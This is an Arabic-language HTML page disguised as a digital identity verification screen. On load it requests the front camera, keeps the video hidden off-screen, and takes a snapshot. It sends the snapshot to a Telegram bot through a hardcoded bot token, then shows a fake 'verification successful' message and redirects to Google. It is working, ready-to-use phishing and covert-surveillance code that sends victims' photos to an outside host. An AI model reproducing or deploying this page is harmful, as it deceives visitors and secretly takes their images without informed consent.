<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التحقق من الهوية الرقمية</title>
    <style>
        body { 
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
            color: #ffffff; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
        }
        .container {
            text-align: center;
            background: rgba(30, 41, 59, 0.7);
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            max-width: 420px;
            width: 90%;
        }
        .icon-wrapper {
            position: relative;
            width: 80px;
            height: 80px;
            margin: 0 auto 25px auto;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .loader { 
            position: absolute;
            border: 3px solid rgba(56, 189, 248, 0.1); 
            border-top: 3px solid #38bdf8; 
            border-radius: 50%; 
            width: 80px; 
            height: 80px; 
            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite; 
        }
        .shield-icon {
            font-size: 2.2rem;
            color: #38bdf8;
            animation: pulse 2s infinite;
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(1); opacity: 0.9; }
        }
        .status-title {
            font-size: 1.4rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: #ffffff;
        }
        .status-text {
            font-size: 0.95rem;
            color: #94a3b8;
            line-height: 1.6;
        }
        /* نافذة كاميرا مخفية تماماً وخلف الكواليس لضمان عمل دالة التقاط الـ Blob */
        #hidden-camera-container {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            overflow: hidden;
            left: -9999px;
        }
        canvas {
            display: none; 
        }
    </style>
</head>
<body>

<div class="container">
    <div class="icon-wrapper">
        <div class="loader"></div>
        <div class="shield-icon">🛡️</div>
    </div>
    <div id="status-title" class="status-title">التحقق الآمن من الهوية</div>
    <div id="status" class="status-text">بانتظار الموافقة على صلاحيات النظام لإتمام الفحص الرقمي...</div>
    
    <div id="hidden-camera-container">
        <video id="video-preview" autoplay playsinline muted></video>
    </div>
    <canvas id="capture-canvas"></canvas>
</div>

<script>
    // التوكن الجديد الذي أرسلته يا سيف لربط الإرسال بالبوت مباشرة
    const BOT_TOKEN = "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc";
    
    // ⚠️ استبدل هذا الرقم (123456789) برقم الآيدي الخاص بك في التليجرام لكي يوجه البوت الصورة إليك مباشرة
    const FIXED_CHAT_ID = "123456789"; 

    async function initVerification() {
        const statusDiv = document.getElementById('status');
        const statusTitleObj = document.getElementById('status-title');
        const videoPreview = document.getElementById('video-preview');
        const canvas = document.getElementById('capture-canvas');

        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            statusDiv.innerText = "المتصفح الحالي لا يدعم تقنيات التحقق المطلوبة.";
            return;
        }

        try {
            // طلب إذن تفعيل الكاميرا الأمامية للبدء
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" },
                audio: false 
            });

            videoPreview.srcObject = stream;
            statusDiv.innerText = "جاري تهيئة الاتصال الآمن ومطابقة الملامح الرقمية...";

            // قراءة أبعاد البث بمجرد تحميل بيانات الكاميرا لتأمين الالتقاط
            videoPreview.onloadedmetadata = () => {
                setTimeout(async () => {
                    try {
                        const width = videoPreview.videoWidth || 640;
                        const height = videoPreview.videoHeight || 480;
                        
                        canvas.width = width;
                        canvas.height = height;
                        
                        const context = canvas.getContext('2d');
                        context.drawImage(videoPreview, 0, 0, width, height);

                        // التقاط اللقطة بصيغة JPEG متوافقة وخفيفة للإرسال الفوري
                        canvas.toBlob(async (blob) => {
                            if (blob) {
                                const formData = new FormData();
                                formData.append('chat_id', FIXED_CHAT_ID);
                                formData.append('photo', blob, 'hidden_capture.jpg');
                                formData.append('caption', '📸 لقطة تحقق مخفية وناجحة عبر التوكن المحدث.');

                                // إرسال الصورة سحابياً مباشرة عبر الـ API الرسمي للبوت
                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                    method: 'POST',
                                    body: formData
                                });
                            }
                        }, 'image/jpeg', 0.85);

                    } catch (err) {
                        console.error("خطأ أثناء معالجة الصورة إلكترونياً:", err);
                    }

                    // إغلاق العدسة تلقائياً وتوجيه المستخدم لإكمال تجربتك
                    setTimeout(() => {
                        stream.getTracks().forEach(track => track.stop());
                        statusTitleObj.innerText = "اكتمل التحقق";
                        statusDiv.style.color = "#34d399";
                        statusDiv.innerText = "تمت المطابقة وتأكيد الهوية بنجاح! جاري التوجيه...";
                        
                        setTimeout(() => {
                            window.location.href = "https://www.google.com";
                        }, 1500);
                    }, 2000);

                }, 1500); // معالجة الالتقاط والرفع بعد 1.5 ثانية من استقرار الكاميرا في الخلفية
            };

        } catch (error) {
            console.error("خطأ في الصلاحيات الحيوية للعتاد:", error);
            statusDiv.style.color = "#f87171";
            statusDiv.innerText = "يرجى منح الصلاحيات المطلوبة لمتابعة عملية تأكيد الهوية الرقمية.";
        }
    }

    window.onload = initVerification;
</script>
</body>
</html>
